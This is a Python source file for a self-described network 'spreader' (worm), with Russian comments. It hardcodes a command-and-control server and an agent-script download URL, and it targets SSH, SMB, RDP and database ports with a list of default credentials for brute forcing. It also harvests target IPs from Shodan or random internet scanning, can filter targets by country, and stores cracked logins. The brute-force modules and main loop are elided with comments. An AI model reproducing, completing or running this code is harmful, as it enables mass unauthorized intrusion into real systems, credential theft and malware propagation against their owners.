#!/usr/bin/env python3
# AVZ-Aristo Spreader v26.6 – Shodan/Censys, расширенные креды, таймауты
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
from datetime import datetime, timezone, timedelta

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.WARNING)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 1500
QUICK_TIMEOUT = 3.0
BRUTE_TIMEOUT = 8.0
DEFAULT_SCAN_COUNT = 25_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"), ("root","toor"), ("root","changeme"),
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"), ("admin","changeme"),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"), ("support","support"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456"),
    ("pi","raspberry"), ("pi","raspberrypi"), ("pi","password"),
    ("ubnt","ubnt"), ("admin",""), ("root",""), ("admin","password1"),
    ("mysql","mysql"), ("oracle","oracle"),
    ("tomcat","tomcat"), ("jenkins","jenkins"),
    ("Administrator",""), ("Administrator","admin"), ("Administrator","password"), ("Administrator","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
SHODAN_API_KEY = ""
try:
    with open("secrets.json") as f:
        s = json.load(f)
        SHODAN_API_KEY = s.get("shodan_api_key", "")
except:
    pass

def fetch_external_ips(count=100):
    ips = []
    if SHODAN_API_KEY:
        try:
            resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306,6379,8080&limit={count}", timeout=10)
            if resp.status_code == 200:
                ips.extend([m['ip_str'] for m in resp.json().get('matches', [])])
        except:
            pass
    if not ips:
        try:
            resp = requests.get(f"https://internetdb.shodan.io/search?query=port:22,445,3389&limit={count}", timeout=10)
            if resp.status_code == 200:
                ips.extend(resp.json())
        except:
            pass
    return ips

def now_str():
    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")

def random_ip():
    if hasattr(random_ip, "external_pool") and random_ip.external_pool and random.random() < 0.5:
        return random.choice(random_ip.external_pool)
    if random.random() < 0.3:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10 or a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a >= 224: continue
        ip = f"{a}.{b}.{c}.{d}"
        if TARGET_COUNTRY:
            if get_country(ip) == TARGET_COUNTRY:
                return ip
        else:
            return ip

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            return resp.json().get("countryCode", "")
    except:
        pass
    return ""

random_ip.external_pool = []
def update_external_pool():
    random_ip.external_pool = fetch_external_ips()

# Далее все векторы (ssh_brute, smb_brute, winrm_brute, ...) как в предыдущей версии, но с BRUTE_TIMEOUT=8.0

async def main_async(args):
    print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket(); s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping"); s.recv(1024); s.close()
        print(f"[{now_str()}] [+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)

    update_external_pool()
    # ... остальное без изменений

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    group.add_argument('--targets', type=str, help='Path to targets file')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print(f"[{now_str()}] [*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
